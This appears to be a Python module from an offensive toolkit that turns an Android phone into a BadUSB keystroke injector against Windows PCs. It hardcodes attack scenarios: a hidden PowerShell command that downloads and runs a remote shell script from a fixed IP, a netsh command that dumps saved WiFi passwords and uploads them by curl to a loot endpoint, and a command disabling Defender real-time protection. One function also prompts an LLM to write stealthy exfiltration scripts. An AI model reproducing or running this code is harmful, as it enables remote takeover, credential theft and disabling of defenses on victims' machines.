"""
BADUSB / HID ATTACK MODULE (Fase 5)
=====================================
Mengubah Redmi Note 14 menjadi USB Rubber Ducky.
Memungkinkan AI menyuntikkan perintah keyboard/mouse ke PC target via kabel USB.
"""
import logging
import time
import os
import json

log = logging.getLogger("BadUSB")

class BadUSBModule:
    LOOT_DIR = os.path.join(os.path.dirname(__file__), "..", "knowledge", "badusb")
    
    def __init__(self):
        os.makedirs(self.LOOT_DIR, exist_ok=True)

    @staticmethod
    def craft_ducky_payload(commands: list) -> str:
        """Mengonversi daftar perintah menjadi skrip Python yang bisa dieksekusi di Android."""
        payload = "import time, subprocess\n"
        for cmd in commands:
            cmd = cmd.strip()
            if not cmd: continue
            
            if cmd.startswith("DELAY"):
                try:
                    delay = int(cmd.split()[1]) / 1000
                    payload += f"time.sleep({delay})\n"
                except: pass
            elif cmd.startswith("STRING"):
                text = cmd[7:].replace("'", "\\'")
                # Fallback ke ADB input text (lambat tapi universal)
                payload += f"subprocess.run(['input', 'text', '{text}'], capture_output=True)\n"
            elif cmd.startswith("ENTER"):
                payload += "subprocess.run(['input', 'keyevent', '66'], capture_output=True)\n"
            elif cmd.startswith("GUI") or cmd.startswith("WINDOWS"):
                # Windows key
                payload += "subprocess.run(['input', 'keyevent', '3'], capture_output=True)\n"
            elif cmd.startswith("REM"):
                pass # Comment
        return payload

    @staticmethod
    def get_predefined_scenarios():
        return {
            "REVERSE_SHELL": [
                "GUI r", "DELAY 500", 
                "STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://"+os.environ.get("NOIR_VPS_IP", "8.215.23.17")+"/shell.ps1')\"",
                "ENTER"
            ],
            "EXFILTRATE_WIFI": [
                "GUI r", "DELAY 500",
                "STRING cmd /c \"netsh wlan show profile name=* key=clear > %temp%\\w.txt && curl -F file=@%temp%\\w.txt http://"+os.environ.get("NOIR_VPS_IP", "8.215.23.17")+"/api/loot/upload\"",
                "ENTER"
            ],
            "DISABLE_DEFENDER": [
                "GUI r", "DELAY 500",
                "STRING powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                "ENTER"
            ]
        }

    @staticmethod
    def trigger_attack(device_id, scenario):
        """Trigger an HID attack."""
        if scenario == "DYNAMIC_SYNTHESIS":
            return BadUSBModule._run_dynamic_synthesis(device_id)
            
        scenarios = BadUSBModule.get_predefined_scenarios()
        if scenario not in scenarios:
            return {"success": False, "reason": "Scenario not found"}
        
        ducky_script = scenarios[scenario]
        python_payload = BadUSBModule.craft_ducky_payload(ducky_script)
        
        log.info(f"[BADUSB] Launching {scenario} via {device_id}...")
        
        # Injeksi ke Vector Memory
        try:
            from vector_memory import vector_memory
            vector_memory.add_experience(
                text=f"BadUSB Attack triggered: {scenario_name} on target connected to {device_id}",
                metadata={"source": "badusb_module", "type": "hardware_attack"}
            )
        except: pass

        return {
            "success": True,
            "device_id": device_id,
            "payload": python_payload,
            "commands": ducky_script
        }

    @staticmethod
    def _run_dynamic_synthesis(device_id):
        """U-12: Gunakan LLM untuk menulis skrip Ducky secara on-the-fly."""
        log.info(f" [HARDWARE] Initiating Dynamic HID Synthesis for {device_id}...")
        
        prompt = (
            "Write a Ducky Script (HID Injection) to gather system info and exfiltrate it via HTTP POST. "
            "Target: Windows 11. Be stealthy and fast. Return ONLY the Ducky Script lines."
        )
        
        from ai_router import OmniRouter
        ducky_script = OmniRouter.query(prompt, task_type="coding")
        
        if "[Error]" in ducky_script:
            return {"success": False, "reason": "AI Synthesis failed."}
            
        # Convert Ducky Script to Python payload (simulating hardware HID calls)
        python_payload = BadUSBModule.craft_ducky_payload(ducky_script.split("\n"))
        
        return {
            "success": True,
            "scenario": "DYNAMIC_SYNTHESIS",
            "device_id": device_id,
            "payload": python_payload,
            "commands": ducky_script.split("\n")
        }

badusb_module = BadUSBModule()
